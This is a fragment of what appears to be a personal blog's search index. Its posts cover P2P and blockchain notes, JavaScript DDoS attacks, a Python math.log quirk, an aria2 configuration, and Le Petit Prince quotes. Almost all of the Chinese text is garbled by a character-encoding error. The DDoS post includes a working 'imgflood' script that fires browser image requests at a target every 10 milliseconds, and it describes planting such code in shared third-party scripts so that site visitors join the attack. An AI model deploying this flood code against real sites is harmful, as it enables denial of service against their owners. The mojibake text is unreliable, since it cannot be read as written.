é«˜æ€§ä»·æ¯”\né‡‡ç”¨P2Pæ¶æ„å¯ä»¥æœ‰æ•ˆåœ°åˆ©ç”¨äº’è”ç½‘ä¸­æ•£æ­¥çš„å¤§é‡æ™®é€šèŠ‚ç‚¹ï¼Œå°†è®¡ç®—ä»»åŠ¡æˆ–å­˜å‚¨èµ„æ–™åˆ†å¸ƒåˆ°æ‰€æœ‰èŠ‚ç‚¹ä¸Šï¼Œåˆ©ç”¨å…¶ä¸­ç©ºç½®çš„è®¡ç®—èƒ½åŠ›æˆ–å­˜å‚¨ç©ºé—´è¾¾åˆ°é«˜æ€§èƒ½è®¡ç®—å’Œæµ·é‡å­˜å‚¨çš„ç›®çš„ã€‚\n  éšç§ä¿æŠ¤\nåœ¨P2Pä¸­ï¼Œæ‰€æœ‰å‚ä¸è€…å¯ä»¥æä¾›ä¸­ç»§è½¬å‘çš„åŠŸèƒ½ï¼Œå› æ­¤å¤§å¤§æé«˜äº†åŒ¿åé€šä¿¡çš„çµæ´»æ€§å’Œå¯é æ€§ï¼Œèƒ½å¤Ÿä¸ºç”¨æˆ·æä¾›æ›´å¥½çš„éšç§ä¿æŠ¤ã€‚\n  è´Ÿè½½å‡è¡¡\nåœ¨P2Pç½‘ç»œç¯å¢ƒä¸‹ç”±äºæ¯ä¸ªèŠ‚ç‚¹æ—¢æ˜¯æœåŠ¡å™¨åˆæ˜¯å®¢æˆ·ç«¯ï¼Œå‡å°‘äº†å¯¹ä¼ ç»ŸC/Sç»“æ„ä¸­æœåŠ¡å™¨è®¡ç®—èƒ½åŠ›ã€å­˜å‚¨èƒ½åŠ›çš„è¦æ±‚ï¼ŒåŒæ—¶ç”±äºèµ„æºåˆ†å¸ƒåœ¨å¤šä¸ªèŠ‚ç‚¹ï¼Œå› æ­¤èƒ½æ›´å¥½åœ°å®ç°æ•´ä¸ªç½‘ç»œçš„è´Ÿè½½å‡è¡¡ã€‚\n  P2PåŠ å¯†   æ–‡ä»¶å†…å®¹å…±äº«å’Œä¸‹è½½ï¼Œä¾‹å¦‚Napsterã€Gnutellaã€eDonkeyç­‰\n  è®¡ç®—èƒ½åŠ›å’Œå­˜å‚¨å…±äº«ï¼Œä¾‹å¦‚SETI@homeã€Avakiç­‰\n  åŸºäºP2PæŠ€æœ¯çš„ååŒä¸æœåŠ¡å…±äº«å¹³å°ï¼Œä¾‹å¦‚JXTAç­‰\n  å³æ—¶é€šè®¯å·¥å…·ï¼ŒåŒ…æ‹¬ICQã€QQã€Yahoo Messengerç­‰\n  P2Pé€šè®¯ä¸ä¿¡æ¯å…±äº«ï¼Œä¾‹å¦‚Skypeã€Crowdsã€Onion Routingç­‰ï¼›\n  åŸºäºP2PæŠ€æœ¯çš„ç½‘ç»œç”µè§†ï¼šæ²¸ç‚¹ã€PPStreamã€ PPLiveã€ QQLiveã€ SopCastç­‰ã€‚\n  æ‹“æ‰‘ç»“æ„ æ‹“æ‰‘ç»“æ„æ˜¯æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å„ä¸ªè®¡ç®—å•å…ƒä¹‹é—´çš„ç‰©ç†æˆ–é€»è¾‘çš„äº’è”å…³ç³»ï¼Œç»“ç‚¹ä¹‹é—´çš„æ‹“æ‰‘ç»“æ„ä¸€ç›´æ˜¯ç¡®å®šç³»ç»Ÿç±»å‹çš„é‡è¦ä¾æ®ã€‚\nP2Pç½‘ç»œçš„æ‹“æ‰‘ç»“æ„ æ ¹æ®ç»“æ„å…³ç³»å¯ä»¥å°†P2Pç³»ç»Ÿç»†åˆ†ä¸ºå››ç§æ‹“æ‰‘å½¢å¼ï¼š\n  ä¸­å¿ƒåŒ–æ‹“æ‰‘ï¼ˆCentralized Topologyï¼‰\n  å…¨åˆ†å¸ƒå¼éç»“æ„åŒ–æ‹“æ‰‘ï¼ˆDecentralized Unstructured Topologyï¼‰\n  å…¨åˆ†å¸ƒå¼ç»“æ„åŒ–æ‹“æ‰‘ï¼ˆDecentralized Structured Topologyï¼Œä¹Ÿç§°ä½œDHTç½‘ç»œï¼‰\n  åŠåˆ†å¸ƒå¼æ‹“æ‰‘ï¼ˆPartially Decentralized Topologyï¼‰\n  ä¸­å¿ƒåŒ–æ‹“æ‰‘ç»“æ„ å³å­˜åœ¨ä¸€ä¸ªä¸­å¿ƒèŠ‚ç‚¹ä¿å­˜äº†å…¶ä»–æ‰€æœ‰èŠ‚ç‚¹çš„ç´¢å¼•ä¿¡æ¯ï¼Œç´¢å¼•ä¿¡æ¯ä¸€èˆ¬åŒ…æ‹¬IPåœ°å€ã€ç«¯å£ã€èŠ‚ç‚¹èµ„æºç­‰ã€‚\nNapsteræ˜¯æœ€æ—©å‡ºç°çš„P2Pç³»ç»Ÿä¹‹ä¸€ï¼Œå®ƒçš„å·¥ä½œåŸç†å¦‚å›¾æ‰€ç¤ºã€‚å½“æŸä¸ªç”¨æˆ·éœ€è¦æŸä¸ªéŸ³ä¹æ–‡ä»¶æ—¶ï¼Œé¦–å…ˆè¿æ¥åˆ°Napsterä¸­å¤®ç´¢å¼•æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œæ£€ç´¢ï¼ŒæœåŠ¡å™¨è¿”å›å­˜æœ‰è¯¥æ–‡ä»¶çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå†ç”±è¯·æ±‚è€…ç›´æ¥è¿åˆ°æ–‡ä»¶çš„æ‰€æœ‰è€…ä¼ è¾“æ–‡ä»¶ã€‚Napsteré¦–å…ˆå®ç°äº†æ–‡ä»¶æŸ¥è¯¢ä¸æ–‡ä»¶ä¼ è¾“çš„åˆ†ç¦»ï¼Œæœ‰æ•ˆåœ°èŠ‚çœäº†ä¸­å¤®æœåŠ¡å™¨çš„å¸¦å®½æ¶ˆè€—ï¼Œå‡å°‘äº†ç³»ç»Ÿçš„æ–‡ä»¶ä¼ è¾“å»¶æ—¶ã€‚\n  ä¼˜ç‚¹\n ç»´æŠ¤ç®€å•ã€èµ„æºå‘ç°æ•ˆç‡é«˜    ç¼ºç‚¹\n ä¸­å¤®ç´¢å¼•æœåŠ¡å™¨çš„ç˜«ç—ªå®¹æ˜“å¯¼è‡´æ•´ä¸ªç½‘ç»œçš„å´©æºƒï¼Œå› æ­¤å¯é æ€§å’Œå®‰å…¨æ€§è¾ƒä½ã€‚ éšç€ç½‘ç»œè§„æ¨¡çš„æ‰©å¤§ï¼Œå¯¹ä¸­å¤®ç´¢å¼•æœåŠ¡å™¨è¿›è¡Œç»´æŠ¤å’Œæ›´æ–°çš„è´¹ç”¨å°†æ€¥å‰§å¢åŠ ï¼Œæ‰€éœ€æˆæœ¬è¾ƒé«˜ã€‚ ä¸­å¤®ç´¢å¼•æœåŠ¡å™¨çš„å­˜åœ¨å¸¸å¼•èµ·ç‰ˆæƒé—®é¢˜ä¸Šçš„çº çº·ï¼ŒæœåŠ¡æä¾›å•†å®¹æ˜“è¢«è¿½ç©¶æ³•å¾‹è´£ä»»ã€‚    ","description":"The courese of BlockChain.There are some notes.","tags":["blockChain","bitcoin","studyNote"],"title":"BlockChain","uri":"/posts/blockchain/"},{"categories":["network"],"content":"å…³äºJavaScriptçš„DDoSæ”»å‡»  å¼•ç”¨ï¼š\nhttps://www.freebuf.com/news/66447.html\n è¯¥æ”»å‡»å±äºåº”ç”¨å±‚æ”»å‡»  Javascriptå®ç°DDosæ”»å‡»åŸç†åˆ†æ   ã€€ç°åœ¨ç½‘ç«™çš„äº¤äº’æ€§éƒ½æ˜¯é€šè¿‡JavaScriptæ¥å®ç°çš„ã€‚é€šè¿‡æ·»åŠ JavaScriptç›´æ¥æ’å…¥HTMLå…ƒç´ ï¼Œæˆ–é€šè¿‡è¿œç¨‹æ¥åŠ è½½JavaScriptã€‚æµè§ˆå™¨ä¼šè¯»å–scriptæ ‡ç­¾ä¸­çš„srcå±æ€§å¹¶è¿è¡Œå®ƒæ‰€æŒ‡å‘çš„è„šæœ¬ï¼Œå…¶å®ä¸åªæ˜¯scriptæ ‡ç­¾å¯ä»¥ç”¨æ¥æ”»å‡»ï¼Œç®€å•æ¥è¯´åªè¦æ˜¯å¯ä»¥è·¨åŸŸè®¿é—®çš„æ ‡ç­¾ï¼Œå¦‚imgï¼Œlinkç­‰éƒ½å¯ä»¥å®ç°DDosæ”»å‡»ã€‚\nã€€æ—¢ç„¶è¿™äº›æ ‡ç­¾å¯ä»¥è®¿é—®å¤–ç«™çš„èµ„æºï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±å¯ä»¥è®¾ä¸ªå®šæ—¶å™¨æ— é™è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»å‘¢ï¼Œé‚£æ˜¯è‚¯å®šçš„ã€‚\n å¦‚æœæ”»å‡»è€…åœ¨ä¸€ä¸ªç½‘ç«™ä¸­åµŒå…¥äº†æ¶æ„JavaScriptè„šæœ¬ï¼Œé‚£ä¹ˆè¯¥ç½‘ç«™çš„æ¯ä¸€ä¸ªè®¿å®¢éƒ½å°†æˆä¸ºDDoSæ”»å‡»ä¸­çš„ä¸€å‘˜ã€‚ç½‘ç«™æµé‡è¶Šé«˜å°±æ„å‘³ç€DDoSè¶Šä¸¥é‡ã€‚\nå…¥ä¾µå…±äº«JavaScriptçš„ç¬¬ä¸‰æ–¹æœåŠ¡å™¨\nè®¸å¤šç½‘ç«™ä½¿ç”¨çš„éƒ½æ˜¯æ™®é€šçš„JavaScriptåº“ï¼Œä¸ºäº†èŠ‚çº¦å¸¦å®½ã€æå‡æ€§èƒ½ï¼Œé€šå¸¸è¿˜ä¼šå°†JavaScriptè„šæœ¬å…±äº«åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœç½‘ç«™ä¸ŠåŒ…å«æœ‰æŒ‡å‘ç¬¬ä¸‰æ–¹æœåŠ¡å™¨çš„è„šæœ¬æ ‡ç­¾ï¼Œå°±æ„å‘³ç€æ‰€æœ‰è®¿é—®è¯¥ç½‘ç«™çš„ç”¨æˆ·éƒ½å°†è‡ªåŠ¨ä¸‹è½½JavaScriptè„šæœ¬ï¼Œå¹¶æ‰§è¡Œã€‚ä¸å¹¸çš„æ˜¯ï¼Œå¦‚æœæ”»å‡»è€…å…¥ä¾µäº†è¯¥ç¬¬ä¸‰æ–¹æœåŠ¡å™¨å¹¶åœ¨JavaScriptè„šæœ¬ä¸­æ³¨å…¥äº†DDoSæ”»å‡»ä»£ç ï¼Œé‚£ç»“æœå¯æƒ³è€ŒçŸ¥äº†ï¼Œæ‰€æœ‰çš„è®¿å®¢ä¹Ÿå°†å˜æˆDDoSæ”»å‡»ä¸­çš„ä¸€å‘˜ã€‚\nä¸€æ®µç®€å•çš„JSä»£ç å°±èƒ½å‘èµ·DoSæ”»å‡»\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  \u003chead\u003e \u003cscript type='text/javascript'\u003e function imgflood(){ //var TARGET = 'victim-website.com' \tvar TARGET = \"127.0.0.1:12345\" var URI = '/index?' var pic = new Image() var rand = Math.floor(Math.random()*1000) pic.src = 'http://'+TARGET+URI+'val='+rand //pic.src = 'http://'+TARGET+URI+'val='+rand } setInterval(imgflood, 10) alert(pic.src) \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e f*********************king \u003cscript type='text/javascript'\u003eimgflood()\u003c/script\u003e \u003c/body\u003e    setInterval(code, millisec):ä»¥millisec æ¯«ç§’çš„é—´éš”æ‰§è¡Œcode\nç”±äºå¤§éƒ¨åˆ†ç½‘é¡µå¼•ç”¨jqueryæ˜¯ä»å¤–éƒ¨å¼•ç”¨çš„ï¼Œå› æ­¤å¯ä»¥ä»æ­¤å‘èµ·ä¸­é—´äººæ”»å‡»\n1  \u003cscript src=\"https://code.jquery.com/jquery-1.10.2.min.js\"\u003e   é¢„é˜²çš„è¯ï¼Œå°±æ˜¯é€šè¿‡scriptæ ‡ç­¾æ”¯æŒçš„å±æ€§integrityï¼šè¿™ä¸ªå±æ€§æ”¯æŒéªŒè¯è¯¥jsè„šæœ¬çš„hashå€¼ï¼Œç¡®ä¿ä¸ä¼šå¼•ç”¨æ¥è‡ªå¤–éƒ¨æ¶æ„çš„jsè„šæœ¬\n1 2 3  \u003cscript src=\"https://code.jquery.com/jquery-1.10.2.min.js\" integrity=\"sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg=\" crossorigin=\"anonymous\"\u003e   ä¸­é—´äººæ”»å‡»ç¤ºæ„å›¾ï¼šæ”»å‡»å…¶ä¸­çš„è¯·æ±‚å¤–éƒ¨jsçš„é€”å¾„\n åœ¨å†™js-DDoSçš„é—®é¢˜ï¼š\nHTMLå¼•å…¥å¤–éƒ¨jsè„šæœ¬ï¼Œæ”¾åœ¨headä¸­ä¸èµ·ä½œç”¨,æ”¾åœ¨bodyä¸­æ‰èµ·ä½œç”¨ è¿™æ˜¯å› ä¸ºåŠ è½½HTMLæ–‡æ¡£æ—¶ï¼Œå…ˆåŠ è½½äº†jsè„šæœ¬åå°±ä¸èµ·ä½œç”¨äº†ã€‚ ä¸€èˆ¬å¼•å…¥å¤–éƒ¨cssæ–‡ä»¶æ”¾åœ¨headä¸­ï¼Œå¼•å…¥å¤–éƒ¨jsè„šæœ¬æ”¾åœ¨bodyä¸­ã€‚ å…ˆæ¸²æŸ“HTMLæ–‡æ¡£(css)ï¼Œå†åŠ è½½ç‰¹æ•ˆ(js)\n","description":"","tags":["DDoS","network","javaScript"],"title":"DDoS-JavaScript","uri":"/posts/ddos-javascript/"},{"categories":["misc"],"content":"To record some strange tricks Python 1.something about math.log å¦‚å›¾ï¼Œå½“math.log(125,5)æ—¶åº”è¯¥å€¼ä¸º3çš„ï¼Œä½†æ˜¯å‡ºäº†ä¸€ä¸ªbug\nå¥½å¥‡å¿ƒé©±ä½¿æˆ‘å»å†™ä¸€ä¸ªè„šæœ¬çœ‹çœ‹ï¼Œç„¶åå‘ç°è¿™äº›èƒ½hack math.logå‡½æ•°çš„ä¸åœ¨å°‘æ•°\n1 2 3 4 5  for i in range(2,101): for j in range(100): ij = i**j if math.log(ij, i) != j: print(i,'\\t',j)   ç„¶åå»ubuntuè™šæ‹Ÿæœºå°è¯•äº†python2ï¼Œå‘ç°ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜\nçœ‹äº†å®˜æ–¹æ–‡æ¡£ï¼Œå‘ç°æœ‰åº•æ•°çš„å¯¹æ•°å‡½æ•°æ˜¯é€šè¿‡æ¢åº•å…¬å¼å®ç°çš„ï¼Œç»Ÿä¸€æ¢æˆä»¥eä¸ºåº•çš„å¯¹æ•°å»è®¡ç®—ï¼Œå› æ­¤ä¼šæœ‰é™¤æ³•çš„æº¢å‡ºå¯¼è‡´ä»¥ä¸Šé—®é¢˜ã€‚\n   math.``log(x[, base])\nWith one argument, return the natural logarithm of x (to base e). With two arguments, return the logarithm of x to the given base, calculated as log(x)/log(base).\n   1  math.log(x[,base]) = log(x) / log(base)   å“ªæ€•æ˜¯math.log(x**y,x)ä¹Ÿä¼šæœ‰è¿™ä¸ªé—®é¢˜ã€‚\næœ€æœ‰åŠ›çš„è¯æ˜ï¼š\n ","description":"","tags":[],"title":"tricks","uri":"/posts/tricks/"},{"categories":["tech"],"content":"Aria2  å‚è€ƒï¼š\naria2\naria2 manual\ngithub-aria2\nWindows ä¸‹å¦‚ä½•é…ç½® Aria 2\nAriaNg å¼ºå¤§çš„ Aria2 Web ç«¯ å®‰è£…åŠä½¿ç”¨\n  webuié…ç½®ï¼š\nYAAW\nAriaNg\n ç”±äºä¸æƒ³ä¸‹è½½å¯çˆ±çš„è¿…é›·ï¼Œäºæ˜¯æœç´¢æœç´¢å°±å¾—åˆ°äº†è¿™ä¸ªä¸‹è½½å·¥å…·â€”â€”Aria2\nè¿™ä¸œè¥¿ä¸ä»…å¯ä»¥å½“ä½œä¸‹è½½å™¨ï¼Œè€Œä¸”å¯ä»¥æ”¯æŒå„ç§åè®®ï¼ŒåŒ…æ‹¬btç­‰ç­‰\nå®‰è£…æ­¥éª¤ 1.è¿›å…¥å®˜æ–¹é¡µé¢ Aria2ï¼Œä¹Ÿå¯ä»¥å»å®˜æ–¹githubçš„é¡¹ç›®åœ°å€ https://github.com/aria2/aria2/releases/tag/release-1.35.0 ä¸‹è½½releaseåŒ…ï¼Œä¹Ÿå¯ä»¥ä¸‹æºç è‡ªå·±ç¼–è¯‘ã€‚\n2.ä¸‹è½½ä¹‹åè§£å‹è‡³ç›®å½•ä¸‹ï¼Œç„¶åå†è¯¥ç›®å½•ä¸‹æ–°å»ºä»¥ä¸‹4ä¸ªæ–‡ä»¶\n  Aria2.logï¼šæ—¥å¿—ï¼Œç©ºæ–‡ä»¶å³å¯ aria2.sessionï¼šä¸‹è½½å†å²ï¼Œç©ºæ–‡ä»¶å³å¯ aria2.confï¼šé…ç½®æ–‡ä»¶ run.bat or run.vbsï¼šç”¨äºè‡ªåŠ¨å¯åŠ¨æˆ–éšè—çª—å£ï¼Œå¯é€‰   Aria2.confå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118  ## '#'å¼€å¤´ä¸ºæ³¨é‡Šå†…å®¹, é€‰é¡¹éƒ½æœ‰ç›¸åº”çš„æ³¨é‡Šè¯´æ˜, æ ¹æ®éœ€è¦ä¿®æ”¹ ## ## è¢«æ³¨é‡Šçš„é€‰é¡¹å¡«å†™çš„æ˜¯é»˜è®¤å€¼, å»ºè®®åœ¨éœ€è¦ä¿®æ”¹æ—¶å†å–æ¶ˆæ³¨é‡Š ## ## æ–‡ä»¶ä¿å­˜ç›¸å…³ ## # æ–‡ä»¶çš„ä¿å­˜è·¯å¾„(å¯ä½¿ç”¨ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„), é»˜è®¤: å½“å‰å¯åŠ¨ä½ç½® dir=aira2/downloads # å¯ç”¨ç£ç›˜ç¼“å­˜, 0ä¸ºç¦ç”¨ç¼“å­˜, éœ€1.16ä»¥ä¸Šç‰ˆæœ¬, é»˜è®¤:16M #disk-cache=32M # æ–‡ä»¶é¢„åˆ†é…æ–¹å¼, èƒ½æœ‰æ•ˆé™ä½ç£ç›˜ç¢ç‰‡, é»˜è®¤:prealloc # é¢„åˆ†é…æ‰€éœ€æ—¶é—´: none \u003c falloc ? trunc \u003c prealloc # fallocå’Œtruncåˆ™éœ€è¦æ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸æ”¯æŒ # NTFSå»ºè®®ä½¿ç”¨falloc, EXT3/4å»ºè®®trunc, MAC ä¸‹éœ€è¦æ³¨é‡Šæ­¤é¡¹ #file-allocation=none # æ–­ç‚¹ç»­ä¼  continue=true log=aria2/aria2.log ## ä¸‹è½½è¿æ¥ç›¸å…³ ## # æœ€å¤§åŒæ—¶ä¸‹è½½ä»»åŠ¡æ•°, è¿è¡Œæ—¶å¯ä¿®æ”¹, é»˜è®¤:5 #max-concurrent-downloads=5 # åŒä¸€æœåŠ¡å™¨è¿æ¥æ•°, æ·»åŠ æ—¶å¯æŒ‡å®š, é»˜è®¤:1 max-connection-per-server=5 # æœ€å°æ–‡ä»¶åˆ†ç‰‡å¤§å°, æ·»åŠ æ—¶å¯æŒ‡å®š, å–å€¼èŒƒå›´1M -1024M, é»˜è®¤:20M # å‡å®šsize=10M, æ–‡ä»¶ä¸º20MiB åˆ™ä½¿ç”¨ä¸¤ä¸ªæ¥æºä¸‹è½½; æ–‡ä»¶ä¸º15MiB åˆ™ä½¿ç”¨ä¸€ä¸ªæ¥æºä¸‹è½½ min-split-size=10M # å•ä¸ªä»»åŠ¡æœ€å¤§çº¿ç¨‹æ•°, æ·»åŠ æ—¶å¯æŒ‡å®š, é»˜è®¤:5 #split=5 # æ•´ä½“ä¸‹è½½é€Ÿåº¦é™åˆ¶, è¿è¡Œæ—¶å¯ä¿®æ”¹, é»˜è®¤:0 #max-overall-download-limit=0 # å•ä¸ªä»»åŠ¡ä¸‹è½½é€Ÿåº¦é™åˆ¶, é»˜è®¤:0 #max-download-limit=0 # æ•´ä½“ä¸Šä¼ é€Ÿåº¦é™åˆ¶, è¿è¡Œæ—¶å¯ä¿®æ”¹, é»˜è®¤:0 #max-overall-upload-limit=0 # å•ä¸ªä»»åŠ¡ä¸Šä¼ é€Ÿåº¦é™åˆ¶, é»˜è®¤:0 #max-upload-limit=0 # ç¦ç”¨IPv6, é»˜è®¤:false #disable-ipv6=true # è¿æ¥è¶…æ—¶æ—¶é—´, é»˜è®¤:60 #timeout=60 # æœ€å¤§é‡è¯•æ¬¡æ•°, è®¾ç½®ä¸º0è¡¨ç¤ºä¸é™åˆ¶é‡è¯•æ¬¡æ•°, é»˜è®¤:5 #max-tries=5 # è®¾ç½®é‡è¯•ç­‰å¾…çš„ç§’æ•°, é»˜è®¤:0 #retry-wait=0 ## è¿›åº¦ä¿å­˜ç›¸å…³ ## # ä»ä¼šè¯æ–‡ä»¶ä¸­è¯»å–ä¸‹è½½ä»»åŠ¡ input-file=aria2/aria2.session # åœ¨Aria2é€€å‡ºæ—¶ä¿å­˜`é”™è¯¯/æœªå®Œæˆ`çš„ä¸‹è½½ä»»åŠ¡åˆ°ä¼šè¯æ–‡ä»¶ save-session=aria2/aria2.session # å®šæ—¶ä¿å­˜ä¼šè¯, 0ä¸ºé€€å‡ºæ—¶æ‰ä¿å­˜, éœ€1.16.1ä»¥ä¸Šç‰ˆæœ¬, é»˜è®¤:0 #save-session-interval=60 ## RPCç›¸å…³è®¾ç½® ## # å¯ç”¨RPC, é»˜è®¤:false enable-rpc=true # å…è®¸æ‰€æœ‰æ¥æº, é»˜è®¤:false rpc-allow-origin-all=true # å…è®¸éå¤–éƒ¨è®¿é—®, é»˜è®¤:false rpc-listen-all=true # äº‹ä»¶è½®è¯¢æ–¹å¼, å–å€¼:[epoll, kqueue, port, poll, select], ä¸åŒç³»ç»Ÿé»˜è®¤å€¼ä¸åŒ #event-poll=select # RPCç›‘å¬ç«¯å£, ç«¯å£è¢«å ç”¨æ—¶å¯ä»¥ä¿®æ”¹, é»˜è®¤:6800 #rpc-listen-port=6800 # è®¾ç½®çš„RPCæˆæƒä»¤ç‰Œ, v1.18.4æ–°å¢åŠŸèƒ½, å–ä»£ --rpc-user å’Œ --rpc-passwd é€‰é¡¹ #rpc-secret=\u003cTOKEN\u003e # è®¾ç½®çš„RPCè®¿é—®ç”¨æˆ·å, æ­¤é€‰é¡¹æ–°ç‰ˆå·²åºŸå¼ƒ, å»ºè®®æ”¹ç”¨ --rpc-secret é€‰é¡¹ #rpc-user=\u003cUSER\u003e # è®¾ç½®çš„RPCè®¿é—®å¯†ç , æ­¤é€‰é¡¹æ–°ç‰ˆå·²åºŸå¼ƒ, å»ºè®®æ”¹ç”¨ --rpc-secret é€‰é¡¹ #rpc-passwd=\u003cPASSWD\u003e # æ˜¯å¦å¯ç”¨ RPC æœåŠ¡çš„ SSL/TLS åŠ å¯†, # å¯ç”¨åŠ å¯†å RPC æœåŠ¡éœ€è¦ä½¿ç”¨ https æˆ–è€… wss åè®®è¿æ¥ #rpc-secure=true # åœ¨ RPC æœåŠ¡ä¸­å¯ç”¨ SSL/TLS åŠ å¯†æ—¶çš„è¯ä¹¦æ–‡ä»¶, # ä½¿ç”¨ PEM æ ¼å¼æ—¶ï¼Œæ‚¨å¿…é¡»é€šè¿‡ --rpc-private-key æŒ‡å®šç§é’¥ #rpc-certificate=/path/to/certificate.pem # åœ¨ RPC æœåŠ¡ä¸­å¯ç”¨ SSL/TLS åŠ å¯†æ—¶çš„ç§é’¥æ–‡ä»¶ #rpc-private-key=/path/to/certificate.key ## BT/PTä¸‹è½½ç›¸å…³ ## # å½“ä¸‹è½½çš„æ˜¯ä¸€ä¸ªç§å­(ä»¥.torrentç»“å°¾)æ—¶, è‡ªåŠ¨å¼€å§‹BTä»»åŠ¡, é»˜è®¤:true #follow-torrent=true # BTç›‘å¬ç«¯å£, å½“ç«¯å£è¢«å±è”½æ—¶ä½¿ç”¨, é»˜è®¤:6881-6999 listen-port=51413 # å•ä¸ªç§å­æœ€å¤§è¿æ¥æ•°, é»˜è®¤:55 #bt-max-peers=55 # æ‰“å¼€DHTåŠŸèƒ½, PTéœ€è¦ç¦ç”¨, é»˜è®¤:true enable-dht=false # æ‰“å¼€IPv6 DHTåŠŸèƒ½, PTéœ€è¦ç¦ç”¨ #enable-dht6=false # DHTç½‘ç»œç›‘å¬ç«¯å£, é»˜è®¤:6881-6999 #dht-listen-port=6881-6999 # æœ¬åœ°èŠ‚ç‚¹æŸ¥æ‰¾, PTéœ€è¦ç¦ç”¨, é»˜è®¤:false #bt-enable-lpd=false # ç§å­äº¤æ¢, PTéœ€è¦ç¦ç”¨, é»˜è®¤:true enable-peer-exchange=false # æ¯ä¸ªç§å­é™é€Ÿ, å¯¹å°‘ç§çš„PTå¾ˆæœ‰ç”¨, é»˜è®¤:50K #bt-request-peer-speed-limit=50K # å®¢æˆ·ç«¯ä¼ªè£…, PTéœ€è¦ peer-id-prefix=-TR2770- user-agent=Transmission/2.77 peer-agent=Transmission/2.77 # å½“ç§å­çš„åˆ†äº«ç‡è¾¾åˆ°è¿™ä¸ªæ•°æ—¶, è‡ªåŠ¨åœæ­¢åšç§, 0ä¸ºä¸€ç›´åšç§, é»˜è®¤:1.0 seed-ratio=0 # å¼ºåˆ¶ä¿å­˜ä¼šè¯, å³ä½¿ä»»åŠ¡å·²ç»å®Œæˆ, é»˜è®¤:false # è¾ƒæ–°çš„ç‰ˆæœ¬å¼€å¯åä¼šåœ¨ä»»åŠ¡å®Œæˆåä¾ç„¶ä¿ç•™.aria2æ–‡ä»¶ #force-save=false # BTæ ¡éªŒç›¸å…³, é»˜è®¤:true #bt-hash-check-seed=true # ç»§ç»­ä¹‹å‰çš„BTä»»åŠ¡æ—¶, æ— éœ€å†æ¬¡æ ¡éªŒ, é»˜è®¤:false bt-seed-unverified=true # ä¿å­˜ç£åŠ›é“¾æ¥å…ƒæ•°æ®ä¸ºç§å­æ–‡ä»¶(.torrentæ–‡ä»¶), é»˜è®¤:false bt-save-metadata=true   æ³¨æ„ä¿®æ”¹ä»¥ä¸‹é€‰é¡¹ï¼š\ndir=\\path\\to\\Download\\ ï¼ˆä¸‹è½½æ–‡ä»¶ä¿å­˜è·¯å¾„ï¼Œæ”¹ä¸ºä½ æƒ³è¦çš„ï¼‰\nlog=\\path\\to\\Aria2\\Aria2.log ï¼ˆæ—¥å¿—æ–‡ä»¶ï¼Œè·¯å¾„D:\\App\\Aria2\\æ”¹ä¸ºä½ å®‰è£…aria2çš„è·¯å¾„ï¼‰\ninput-file=\\path\\to\\Aria2\\aria2.session\nsave-session=\\path\\to\\Aria2\\aria2.session\nä»¥ä¸‹æ˜¯å¯ä»¥è‡ªåŠ¨éšè—è¿è¡Œaria2çš„è„šæœ¬\nCreateObject(\"WScript.Shell\").Run \"D:\\App\\Aria2\\aria2c.exe --conf-path=aria2.conf\",0 3. ç®¡ç†Aria 2 ä¸‹è½½ä»»åŠ¡\n é¦–å…ˆæˆ‘ä»¬è¦æ‰“å¼€Aria2 çš„WebUIï¼Œå³YAWWæˆ–è€…AriaNg ç„¶åå†é¡µé¢çš„è®¾ç½®ä¸­å°†JSON-RPC Pathè®¾ç½®ä¸ºhttp://localhost:6800/jsonrpc ç‚¹ä¿å­˜ï¼Œå³å¯ã€‚  ","description":"","tags":[],"title":"aria2","uri":"/posts/aria2/"},{"categories":["Reading"],"content":"Le Petit Prince å°ç‹å­\nå¸Œæœ›æˆ‘èƒ½å¦‚å°ç‹å­ä¸€æ ·ï¼Œè¢«ä¸€æœµç«ç‘°æ‰€é©¯åŒ–~\nå¸Œæœ›æˆ‘ä¸‹æ¬¡å†è¯»è¿™æœ¬ä¹¦æ—¶ä¼šæœ‰ä¸ä¸€æ ·çš„æ„Ÿå—æŠŠã€‚\n   æˆ‘å‘Šè¯‰ä½ è¿™ä¹ˆå¤šæœ‰å…³B612å·å°è¡Œæ˜Ÿçš„äº‹æƒ…ï¼Œè®©ä½ çŸ¥é“å®ƒçš„ç¼–å·ï¼Œæ˜¯å› ä¸ºå¤§äººã€‚å¤§äººçƒ­çˆ±æ•°å­—ã€‚......\n  å¦‚æœæœ‰äººçˆ±ä¸Šä¸€æœµèŠ±ï¼Œå¤©ä¸Šçš„æ˜Ÿæ˜Ÿæœ‰äº¿ä¸‡é¢—ï¼Œè€Œè¿™æœµèŠ±åªé•¿åœ¨å…¶ä¸­ä¸€é¢—ä¸Šï¼Œè¿™è¶³ä»¥è®©ä»–å†ä»°æœ›å¤œç©ºæ—¶æ„Ÿåˆ°å¾ˆå¿«ä¹ã€‚ä»–ä¼šå‘Šè¯‰è‡ªå·±ï¼šâ€œåœ¨æ˜Ÿç©ºçš„æŸå¤„æœ‰æˆ‘çš„èŠ±ã€‚â€\n  